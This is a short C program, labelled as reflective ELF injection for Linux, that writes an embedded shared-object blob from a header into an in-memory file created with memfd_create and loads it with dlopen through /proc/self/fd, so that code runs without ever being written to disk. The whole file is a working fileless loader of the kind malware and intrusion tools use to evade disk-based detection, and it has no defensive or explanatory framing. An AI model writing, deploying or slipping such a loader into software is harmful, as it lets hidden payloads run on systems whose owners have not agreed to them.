#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include "pkg/elf_sc.h"

/* Reflective .so ELF injection for Linux */

int main() {
    // Create a file descriptor in memory
    int anon_elf_fd = memfd_create("my_elf", MFD_CLOEXEC);
    if (anon_elf_fd == -1) {
        perror("memfd_create");
        return EXIT_FAILURE;
    }

    // Write our ELF into the file descriptor in memory
    ssize_t bytes_written = write(anon_elf_fd, elf, elf_len);
    if (bytes_written != elf_len) { // Check if the write was successful
        perror("write");
        close(anon_elf_fd);
        return EXIT_FAILURE;
    }

    // reset file offset
    if (lseek(anon_elf_fd, 0, SEEK_SET) == -1) {
        perror("lseek");
        close(anon_elf_fd);
        return EXIT_FAILURE;
    }

    // make the path to the memory file descriptor
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", anon_elf_fd);

    // load the shared object
    void *handle = dlopen(path, RTLD_NOW | RTLD_GLOBAL);
    if (!handle) {
        fprintf(stderr, "Error loading .so: %s\n", dlerror());
        close(anon_elf_fd);
        return EXIT_FAILURE;
    }

    // clean up
    close(anon_elf_fd);
    dlclose(handle);
    return EXIT_SUCCESS;
}
